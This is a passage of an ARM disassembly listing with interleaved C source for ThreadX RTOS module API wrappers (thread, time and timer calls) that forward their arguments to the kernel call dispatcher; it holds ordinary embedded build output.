 802147a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 802147c:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) wait_aborts;
 802147e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8021480:	62bb      	str	r3, [r7, #40]	; 0x28
    extra_parameters[7] = (ALIGN_TYPE) non_idle_returns;
 8021482:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8021484:	62fb      	str	r3, [r7, #44]	; 0x2c
    extra_parameters[8] = (ALIGN_TYPE) idle_returns;
 8021486:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 8021488:	633b      	str	r3, [r7, #48]	; 0x30

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) resumptions, (ALIGN_TYPE) suspensions, (ALIGN_TYPE) extra_parameters);
 802148a:	4b08      	ldr	r3, [pc, #32]	; (80214ac <_tx_thread_performance_system_info_get+0x54>)
 802148c:	f859 3003 	ldr.w	r3, [r9, r3]
 8021490:	681c      	ldr	r4, [r3, #0]
 8021492:	68f9      	ldr	r1, [r7, #12]
 8021494:	68ba      	ldr	r2, [r7, #8]
 8021496:	f107 0310 	add.w	r3, r7, #16
 802149a:	203d      	movs	r0, #61	; 0x3d
 802149c:	47a0      	blx	r4
 802149e:	6378      	str	r0, [r7, #52]	; 0x34

    /* Return value to the caller.  */
    return(return_value);
 80214a0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
}
 80214a2:	4618      	mov	r0, r3
 80214a4:	373c      	adds	r7, #60	; 0x3c
 80214a6:	46bd      	mov	sp, r7
 80214a8:	bd90      	pop	{r4, r7, pc}
 80214aa:	bf00      	nop
 80214ac:	00000004 	.word	0x00000004

080214b0 <_txe_thread_preemption_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_preemption_change(TX_THREAD *thread_ptr, UINT new_threshold, UINT *old_threshold)
{
 80214b0:	b590      	push	{r4, r7, lr}
 80214b2:	b087      	sub	sp, #28
 80214b4:	af00      	add	r7, sp, #0
 80214b6:	60f8      	str	r0, [r7, #12]
 80214b8:	60b9      	str	r1, [r7, #8]
 80214ba:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PREEMPTION_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_threshold, (ALIGN_TYPE) old_threshold);
 80214bc:	4b07      	ldr	r3, [pc, #28]	; (80214dc <_txe_thread_preemption_change+0x2c>)
 80214be:	f859 3003 	ldr.w	r3, [r9, r3]
 80214c2:	681c      	ldr	r4, [r3, #0]
 80214c4:	68f9      	ldr	r1, [r7, #12]
 80214c6:	687b      	ldr	r3, [r7, #4]
 80214c8:	68ba      	ldr	r2, [r7, #8]
 80214ca:	203e      	movs	r0, #62	; 0x3e
 80214cc:	47a0      	blx	r4
 80214ce:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80214d0:	697b      	ldr	r3, [r7, #20]
}
 80214d2:	4618      	mov	r0, r3
 80214d4:	371c      	adds	r7, #28
 80214d6:	46bd      	mov	sp, r7
 80214d8:	bd90      	pop	{r4, r7, pc}
 80214da:	bf00      	nop
 80214dc:	00000004 	.word	0x00000004

080214e0 <_txe_thread_priority_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_priority_change(TX_THREAD *thread_ptr, UINT new_priority, UINT *old_priority)
{
 80214e0:	b590      	push	{r4, r7, lr}
 80214e2:	b087      	sub	sp, #28
 80214e4:	af00      	add	r7, sp, #0
 80214e6:	60f8      	str	r0, [r7, #12]
 80214e8:	60b9      	str	r1, [r7, #8]
 80214ea:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PRIORITY_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_priority, (ALIGN_TYPE) old_priority);
 80214ec:	4b07      	ldr	r3, [pc, #28]	; (802150c <_txe_thread_priority_change+0x2c>)
 80214ee:	f859 3003 	ldr.w	r3, [r9, r3]
 80214f2:	681c      	ldr	r4, [r3, #0]
 80214f4:	68f9      	ldr	r1, [r7, #12]
 80214f6:	687b      	ldr	r3, [r7, #4]
 80214f8:	68ba      	ldr	r2, [r7, #8]
 80214fa:	203f      	movs	r0, #63	; 0x3f
 80214fc:	47a0      	blx	r4
 80214fe:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021500:	697b      	ldr	r3, [r7, #20]
}
 8021502:	4618      	mov	r0, r3
 8021504:	371c      	adds	r7, #28
 8021506:	46bd      	mov	sp, r7
 8021508:	bd90      	pop	{r4, r7, pc}
 802150a:	bf00      	nop
 802150c:	00000004 	.word	0x00000004

08021510 <_txe_thread_relinquish>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _txe_thread_relinquish(VOID)
{
 8021510:	b598      	push	{r3, r4, r7, lr}
 8021512:	af00      	add	r7, sp, #0


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RELINQUISH_CALL, 0, 0, 0);
 8021514:	4b05      	ldr	r3, [pc, #20]	; (802152c <_txe_thread_relinquish+0x1c>)
 8021516:	f859 3003 	ldr.w	r3, [r9, r3]
 802151a:	681c      	ldr	r4, [r3, #0]
 802151c:	2300      	movs	r3, #0
 802151e:	2200      	movs	r2, #0
 8021520:	2100      	movs	r1, #0
 8021522:	2040      	movs	r0, #64	; 0x40
 8021524:	47a0      	blx	r4
}
 8021526:	bf00      	nop
 8021528:	bd98      	pop	{r3, r4, r7, pc}
 802152a:	bf00      	nop
 802152c:	00000004 	.word	0x00000004

08021530 <_txe_thread_reset>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_reset(TX_THREAD *thread_ptr)
{
 8021530:	b590      	push	{r4, r7, lr}
 8021532:	b085      	sub	sp, #20
 8021534:	af00      	add	r7, sp, #0
 8021536:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RESET_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021538:	4b07      	ldr	r3, [pc, #28]	; (8021558 <_txe_thread_reset+0x28>)
 802153a:	f859 3003 	ldr.w	r3, [r9, r3]
 802153e:	681c      	ldr	r4, [r3, #0]
 8021540:	6879      	ldr	r1, [r7, #4]
 8021542:	2300      	movs	r3, #0
 8021544:	2200      	movs	r2, #0
 8021546:	2041      	movs	r0, #65	; 0x41
 8021548:	47a0      	blx	r4
 802154a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802154c:	68fb      	ldr	r3, [r7, #12]
}
 802154e:	4618      	mov	r0, r3
 8021550:	3714      	adds	r7, #20
 8021552:	46bd      	mov	sp, r7
 8021554:	bd90      	pop	{r4, r7, pc}
 8021556:	bf00      	nop
 8021558:	00000004 	.word	0x00000004

0802155c <_txe_thread_resume>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_resume(TX_THREAD *thread_ptr)
{
 802155c:	b590      	push	{r4, r7, lr}
 802155e:	b085      	sub	sp, #20
 8021560:	af00      	add	r7, sp, #0
 8021562:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RESUME_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021564:	4b07      	ldr	r3, [pc, #28]	; (8021584 <_txe_thread_resume+0x28>)
 8021566:	f859 3003 	ldr.w	r3, [r9, r3]
 802156a:	681c      	ldr	r4, [r3, #0]
 802156c:	6879      	ldr	r1, [r7, #4]
 802156e:	2300      	movs	r3, #0
 8021570:	2200      	movs	r2, #0
 8021572:	2042      	movs	r0, #66	; 0x42
 8021574:	47a0      	blx	r4
 8021576:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021578:	68fb      	ldr	r3, [r7, #12]
}
 802157a:	4618      	mov	r0, r3
 802157c:	3714      	adds	r7, #20
 802157e:	46bd      	mov	sp, r7
 8021580:	bd90      	pop	{r4, r7, pc}
 8021582:	bf00      	nop
 8021584:	00000004 	.word	0x00000004

08021588 <_tx_thread_sleep>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_sleep(ULONG timer_ticks)
{
 8021588:	b590      	push	{r4, r7, lr}
 802158a:	b085      	sub	sp, #20
 802158c:	af00      	add	r7, sp, #0
 802158e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SLEEP_CALL, (ALIGN_TYPE) timer_ticks, 0, 0);
 8021590:	4b07      	ldr	r3, [pc, #28]	; (80215b0 <_tx_thread_sleep+0x28>)
 8021592:	f859 3003 	ldr.w	r3, [r9, r3]
 8021596:	681c      	ldr	r4, [r3, #0]
 8021598:	2300      	movs	r3, #0
 802159a:	2200      	movs	r2, #0
 802159c:	6879      	ldr	r1, [r7, #4]
 802159e:	2043      	movs	r0, #67	; 0x43
 80215a0:	47a0      	blx	r4
 80215a2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80215a4:	68fb      	ldr	r3, [r7, #12]
}
 80215a6:	4618      	mov	r0, r3
 80215a8:	3714      	adds	r7, #20
 80215aa:	46bd      	mov	sp, r7
 80215ac:	bd90      	pop	{r4, r7, pc}
 80215ae:	bf00      	nop
 80215b0:	00000004 	.word	0x00000004

080215b4 <_tx_thread_stack_error_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_stack_error_notify(VOID (*stack_error_handler)(TX_THREAD *thread_ptr))
{
 80215b4:	b590      	push	{r4, r7, lr}
 80215b6:	b085      	sub	sp, #20
 80215b8:	af00      	add	r7, sp, #0
 80215ba:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_STACK_ERROR_NOTIFY_CALL, (ALIGN_TYPE) stack_error_handler, 0, 0);
 80215bc:	4b07      	ldr	r3, [pc, #28]	; (80215dc <_tx_thread_stack_error_notify+0x28>)
 80215be:	f859 3003 	ldr.w	r3, [r9, r3]
 80215c2:	681c      	ldr	r4, [r3, #0]
 80215c4:	6879      	ldr	r1, [r7, #4]
 80215c6:	2300      	movs	r3, #0
 80215c8:	2200      	movs	r2, #0
 80215ca:	2044      	movs	r0, #68	; 0x44
 80215cc:	47a0      	blx	r4
 80215ce:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80215d0:	68fb      	ldr	r3, [r7, #12]
}
 80215d2:	4618      	mov	r0, r3
 80215d4:	3714      	adds	r7, #20
 80215d6:	46bd      	mov	sp, r7
 80215d8:	bd90      	pop	{r4, r7, pc}
 80215da:	bf00      	nop
 80215dc:	00000004 	.word	0x00000004

080215e0 <_txe_thread_suspend>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_suspend(TX_THREAD *thread_ptr)
{
 80215e0:	b590      	push	{r4, r7, lr}
 80215e2:	b085      	sub	sp, #20
 80215e4:	af00      	add	r7, sp, #0
 80215e6:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SUSPEND_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 80215e8:	4b07      	ldr	r3, [pc, #28]	; (8021608 <_txe_thread_suspend+0x28>)
 80215ea:	f859 3003 	ldr.w	r3, [r9, r3]
 80215ee:	681c      	ldr	r4, [r3, #0]
 80215f0:	6879      	ldr	r1, [r7, #4]
 80215f2:	2300      	movs	r3, #0
 80215f4:	2200      	movs	r2, #0
 80215f6:	2045      	movs	r0, #69	; 0x45
 80215f8:	47a0      	blx	r4
 80215fa:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80215fc:	68fb      	ldr	r3, [r7, #12]
}
 80215fe:	4618      	mov	r0, r3
 8021600:	3714      	adds	r7, #20
 8021602:	46bd      	mov	sp, r7
 8021604:	bd90      	pop	{r4, r7, pc}
 8021606:	bf00      	nop
 8021608:	00000004 	.word	0x00000004

0802160c <_txe_thread_terminate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_terminate(TX_THREAD *thread_ptr)
{
 802160c:	b590      	push	{r4, r7, lr}
 802160e:	b085      	sub	sp, #20
 8021610:	af00      	add	r7, sp, #0
 8021612:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_TERMINATE_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021614:	4b07      	ldr	r3, [pc, #28]	; (8021634 <_txe_thread_terminate+0x28>)
 8021616:	f859 3003 	ldr.w	r3, [r9, r3]
 802161a:	681c      	ldr	r4, [r3, #0]
 802161c:	6879      	ldr	r1, [r7, #4]
 802161e:	2300      	movs	r3, #0
 8021620:	2200      	movs	r2, #0
 8021622:	2046      	movs	r0, #70	; 0x46
 8021624:	47a0      	blx	r4
 8021626:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021628:	68fb      	ldr	r3, [r7, #12]
}
 802162a:	4618      	mov	r0, r3
 802162c:	3714      	adds	r7, #20
 802162e:	46bd      	mov	sp, r7
 8021630:	bd90      	pop	{r4, r7, pc}
 8021632:	bf00      	nop
 8021634:	00000004 	.word	0x00000004

08021638 <_txe_thread_time_slice_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_time_slice_change(TX_THREAD *thread_ptr, ULONG new_time_slice, ULONG *old_time_slice)
{
 8021638:	b590      	push	{r4, r7, lr}
 802163a:	b087      	sub	sp, #28
 802163c:	af00      	add	r7, sp, #0
 802163e:	60f8      	str	r0, [r7, #12]
 8021640:	60b9      	str	r1, [r7, #8]
 8021642:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_TIME_SLICE_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_time_slice, (ALIGN_TYPE) old_time_slice);
 8021644:	4b07      	ldr	r3, [pc, #28]	; (8021664 <_txe_thread_time_slice_change+0x2c>)
 8021646:	f859 3003 	ldr.w	r3, [r9, r3]
 802164a:	681c      	ldr	r4, [r3, #0]
 802164c:	68f9      	ldr	r1, [r7, #12]
 802164e:	687b      	ldr	r3, [r7, #4]
 8021650:	68ba      	ldr	r2, [r7, #8]
 8021652:	2047      	movs	r0, #71	; 0x47
 8021654:	47a0      	blx	r4
 8021656:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021658:	697b      	ldr	r3, [r7, #20]
}
 802165a:	4618      	mov	r0, r3
 802165c:	371c      	adds	r7, #28
 802165e:	46bd      	mov	sp, r7
 8021660:	bd90      	pop	{r4, r7, pc}
 8021662:	bf00      	nop
 8021664:	00000004 	.word	0x00000004

08021668 <_txe_thread_wait_abort>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_wait_abort(TX_THREAD *thread_ptr)
{
 8021668:	b590      	push	{r4, r7, lr}
 802166a:	b085      	sub	sp, #20
 802166c:	af00      	add	r7, sp, #0
 802166e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_WAIT_ABORT_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021670:	4b07      	ldr	r3, [pc, #28]	; (8021690 <_txe_thread_wait_abort+0x28>)
 8021672:	f859 3003 	ldr.w	r3, [r9, r3]
 8021676:	681c      	ldr	r4, [r3, #0]
 8021678:	6879      	ldr	r1, [r7, #4]
 802167a:	2300      	movs	r3, #0
 802167c:	2200      	movs	r2, #0
 802167e:	2048      	movs	r0, #72	; 0x48
 8021680:	47a0      	blx	r4
 8021682:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021684:	68fb      	ldr	r3, [r7, #12]
}
 8021686:	4618      	mov	r0, r3
 8021688:	3714      	adds	r7, #20
 802168a:	46bd      	mov	sp, r7
 802168c:	bd90      	pop	{r4, r7, pc}
 802168e:	bf00      	nop
 8021690:	00000004 	.word	0x00000004

08021694 <_tx_time_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
ULONG _tx_time_get(VOID)
{
 8021694:	b590      	push	{r4, r7, lr}
 8021696:	b083      	sub	sp, #12
 8021698:	af00      	add	r7, sp, #0

ULONG return_value;

    /* Call module manager dispatcher.  */
    return_value = (ULONG) (_txm_module_kernel_call_dispatcher)(TXM_TIME_GET_CALL, 0, 0, 0);
 802169a:	4b07      	ldr	r3, [pc, #28]	; (80216b8 <_tx_time_get+0x24>)
 802169c:	f859 3003 	ldr.w	r3, [r9, r3]
 80216a0:	681c      	ldr	r4, [r3, #0]
 80216a2:	2300      	movs	r3, #0
 80216a4:	2200      	movs	r2, #0
 80216a6:	2100      	movs	r1, #0
 80216a8:	2049      	movs	r0, #73	; 0x49
 80216aa:	47a0      	blx	r4
 80216ac:	6078      	str	r0, [r7, #4]

    /* Return value to the caller.  */
    return(return_value);
 80216ae:	687b      	ldr	r3, [r7, #4]
}
 80216b0:	4618      	mov	r0, r3
 80216b2:	370c      	adds	r7, #12
 80216b4:	46bd      	mov	sp, r7
 80216b6:	bd90      	pop	{r4, r7, pc}
 80216b8:	00000004 	.word	0x00000004

080216bc <_tx_time_set>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _tx_time_set(ULONG new_time)
{
 80216bc:	b590      	push	{r4, r7, lr}
 80216be:	b083      	sub	sp, #12
 80216c0:	af00      	add	r7, sp, #0
 80216c2:	6078      	str	r0, [r7, #4]


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_TIME_SET_CALL, (ALIGN_TYPE) new_time, 0, 0);
 80216c4:	4b06      	ldr	r3, [pc, #24]	; (80216e0 <_tx_time_set+0x24>)
 80216c6:	f859 3003 	ldr.w	r3, [r9, r3]
 80216ca:	681c      	ldr	r4, [r3, #0]
 80216cc:	2300      	movs	r3, #0
 80216ce:	2200      	movs	r2, #0
 80216d0:	6879      	ldr	r1, [r7, #4]
 80216d2:	204a      	movs	r0, #74	; 0x4a
 80216d4:	47a0      	blx	r4
}
 80216d6:	bf00      	nop
 80216d8:	370c      	adds	r7, #12
 80216da:	46bd      	mov	sp, r7
 80216dc:	bd90      	pop	{r4, r7, pc}
 80216de:	bf00      	nop
 80216e0:	00000004 	.word	0x00000004

080216e4 <_txe_timer_activate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_activate(TX_TIMER *timer_ptr)
{
 80216e4:	b590      	push	{r4, r7, lr}
 80216e6:	b085      	sub	sp, #20
 80216e8:	af00      	add	r7, sp, #0
 80216ea:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_ACTIVATE_CALL, (ALIGN_TYPE) timer_ptr, 0, 0);
 80216ec:	4b07      	ldr	r3, [pc, #28]	; (802170c <_txe_timer_activate+0x28>)
 80216ee:	f859 3003 	ldr.w	r3, [r9, r3]
 80216f2:	681c      	ldr	r4, [r3, #0]
 80216f4:	6879      	ldr	r1, [r7, #4]
 80216f6:	2300      	movs	r3, #0
 80216f8:	2200      	movs	r2, #0
 80216fa:	204b      	movs	r0, #75	; 0x4b
 80216fc:	47a0      	blx	r4
 80216fe:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021700:	68fb      	ldr	r3, [r7, #12]
}
 8021702:	4618      	mov	r0, r3
 8021704:	3714      	adds	r7, #20
 8021706:	46bd      	mov	sp, r7
 8021708:	bd90      	pop	{r4, r7, pc}
 802170a:	bf00      	nop
 802170c:	00000004 	.word	0x00000004

08021710 <_txe_timer_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_change(TX_TIMER *timer_ptr, ULONG initial_ticks, ULONG reschedule_ticks)
{
 8021710:	b590      	push	{r4, r7, lr}
 8021712:	b087      	sub	sp, #28
 8021714:	af00      	add	r7, sp, #0
 8021716:	60f8      	str	r0, [r7, #12]
 8021718:	60b9      	str	r1, [r7, #8]
 802171a:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_CHANGE_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) initial_ticks, (ALIGN_TYPE) reschedule_ticks);
 802171c:	4b07      	ldr	r3, [pc, #28]	; (802173c <_txe_timer_change+0x2c>)
 802171e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021722:	681c      	ldr	r4, [r3, #0]
 8021724:	68f9      	ldr	r1, [r7, #12]
 8021726:	687b      	ldr	r3, [r7, #4]
 8021728:	68ba      	ldr	r2, [r7, #8]
 802172a:	204c      	movs	r0, #76	; 0x4c
 802172c:	47a0      	blx	r4
 802172e:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021730:	697b      	ldr	r3, [r7, #20]
}
 8021732:	4618      	mov	r0, r3
 8021734:	371c      	adds	r7, #28
 8021736:	46bd      	mov	sp, r7
 8021738:	bd90      	pop	{r4, r7, pc}
 802173a:	bf00      	nop
 802173c:	00000004 	.word	0x00000004

08021740 <_txe_timer_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_create(TX_TIMER *timer_ptr, CHAR *name_ptr, VOID (*expiration_function)(ULONG), ULONG expiration_input, ULONG initial_ticks, ULONG reschedule_ticks, UINT auto_activate, UINT timer_control_block_size)
{
 8021740:	b590      	push	{r4, r7, lr}
 8021742:	b08d      	sub	sp, #52	; 0x34
 8021744:	af00      	add	r7, sp, #0
 8021746:	60f8      	str	r0, [r7, #12]
 8021748:	60b9      	str	r1, [r7, #8]
 802174a:	607a      	str	r2, [r7, #4]
 802174c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[6];

    extra_parameters[0] = (ALIGN_TYPE) expiration_function;
 802174e:	687b      	ldr	r3, [r7, #4]
 8021750:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) expiration_input;
 8021752:	683b      	ldr	r3, [r7, #0]
 8021754:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) initial_ticks;
 8021756:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8021758:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) reschedule_ticks;
 802175a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 802175c:	623b      	str	r3, [r7, #32]
    extra_parameters[4] = (ALIGN_TYPE) auto_activate;
 802175e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021760:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[5] = (ALIGN_TYPE) timer_control_block_size;
 8021762:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8021764:	62bb      	str	r3, [r7, #40]	; 0x28

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_CREATE_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8021766:	4b08      	ldr	r3, [pc, #32]	; (8021788 <_txe_timer_create+0x48>)
 8021768:	f859 3003 	ldr.w	r3, [r9, r3]
 802176c:	681c      	ldr	r4, [r3, #0]
 802176e:	68f9      	ldr	r1, [r7, #12]
 8021770:	68ba      	ldr	r2, [r7, #8]
 8021772:	f107 0314 	add.w	r3, r7, #20
 8021776:	204d      	movs	r0, #77	; 0x4d
 8021778:	47a0      	blx	r4
 802177a:	62f8      	str	r0, [r7, #44]	; 0x2c

    /* Return value to the caller.  */
    return(return_value);
 802177c:	6afb      	ldr	r3, [r7, #44]	; 0x2c
}
 802177e:	4618      	mov	r0, r3
 8021780:	3734      	adds	r7, #52	; 0x34
 8021782:	46bd      	mov	sp, r7
 8021784:	bd90      	pop	{r4, r7, pc}
 8021786:	bf00      	nop
 8021788:	00000004 	.word	0x00000004

0802178c <_txe_timer_deactivate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_deactivate(TX_TIMER *timer_ptr)
{
 802178c:	b590      	push	{r4, r7, lr}
 802178e:	b085      	sub	sp, #20
 8021790:	af00      	add	r7, sp, #0
 8021792:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_DEACTIVATE_CALL, (ALIGN_TYPE) timer_ptr, 0, 0);
 8021794:	4b07      	ldr	r3, [pc, #28]	; (80217b4 <_txe_timer_deactivate+0x28>)
 8021796:	f859 3003 	ldr.w	r3, [r9, r3]
 802179a:	681c      	ldr	r4, [r3, #0]
 802179c:	6879      	ldr	r1, [r7, #4]
 802179e:	2300      	movs	r3, #0
 80217a0:	2200      	movs	r2, #0
 80217a2:	204e      	movs	r0, #78	; 0x4e
 80217a4:	47a0      	blx	r4
 80217a6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80217a8:	68fb      	ldr	r3, [r7, #12]
}
 80217aa:	4618      	mov	r0, r3
 80217ac:	3714      	adds	r7, #20
 80217ae:	46bd      	mov	sp, r7
 80217b0:	bd90      	pop	{r4, r7, pc}
 80217b2:	bf00      	nop
 80217b4:	00000004 	.word	0x00000004

080217b8 <_txe_timer_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_delete(TX_TIMER *timer_ptr)
{
 80217b8:	b590      	push	{r4, r7, lr}
 80217ba:	b085      	sub	sp, #20
 80217bc:	af00      	add	r7, sp, #0
 80217be:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_DELETE_CALL, (ALIGN_TYPE) timer_ptr, 0, 0);
 80217c0:	4b07      	ldr	r3, [pc, #28]	; (80217e0 <_txe_timer_delete+0x28>)
 80217c2:	f859 3003 	ldr.w	r3, [r9, r3]
 80217c6:	681c      	ldr	r4, [r3, #0]
 80217c8:	6879      	ldr	r1, [r7, #4]
 80217ca:	2300      	movs	r3, #0
 80217cc:	2200      	movs	r2, #0
 80217ce:	204f      	movs	r0, #79	; 0x4f
 80217d0:	47a0      	blx	r4
 80217d2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80217d4:	68fb      	ldr	r3, [r7, #12]
}
 80217d6:	4618      	mov	r0, r3
 80217d8:	3714      	adds	r7, #20
 80217da:	46bd      	mov	sp, r7
 80217dc:	bd90      	pop	{r4, r7, pc}
 80217de:	bf00      	nop
 80217e0:	00000004 	.word	0x00000004

080217e4 <_txe_timer_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_info_get(TX_TIMER *timer_ptr, CHAR **name, UINT *active, ULONG *remaining_ticks, ULONG *reschedule_ticks, TX_TIMER **next_timer)
{
 80217e4:	b590      	push	{r4, r7, lr}
 80217e6:	b08b      	sub	sp, #44	; 0x2c
 80217e8:	af00      	add	r7, sp, #0
 80217ea:	60f8      	str	r0, [r7, #12]
 80217ec:	60b9      	str	r1, [r7, #8]
 80217ee:	607a      	str	r2, [r7, #4]
 80217f0:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) active;
 80217f2:	687b      	ldr	r3, [r7, #4]
 80217f4:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) remaining_ticks;
 80217f6:	683b      	ldr	r3, [r7, #0]
